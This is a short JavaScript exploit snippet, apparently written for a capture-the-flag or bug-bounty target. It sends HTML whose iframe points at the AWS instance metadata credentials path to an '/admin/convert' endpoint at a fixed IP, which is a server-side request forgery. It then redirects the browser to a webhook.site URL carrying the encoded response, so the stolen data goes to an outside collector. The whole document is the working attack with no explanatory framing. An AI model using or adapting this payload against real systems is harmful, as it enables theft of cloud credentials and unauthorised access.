const htmlCode = '<html><h1>content here</h1><iframe src="http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance" width="1000" height="2000"><h1>end</h1></html>';
const xhr = new XMLHttpRequest();
xhr.open("POST", "http://54.180.108.161/admin/convert");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.onreadystatechange = function() {
    if (xhr.readyState === XMLHttpRequest.DONE) {
        const response = JSON.stringify({
            status: xhr.status,
            statusText: xhr.statusText,
            responseText: xhr.responseText
        });
        const encodedResponse = encodeURIComponent(response);
        const url = "https://webhook.site/a4514114-009a-4532-b80c-5debda7d3c6b/?res=" + encodedResponse;
        window.location.href = url;
    }
};
xhr.send(JSON.stringify({htmlCode: htmlCode}));
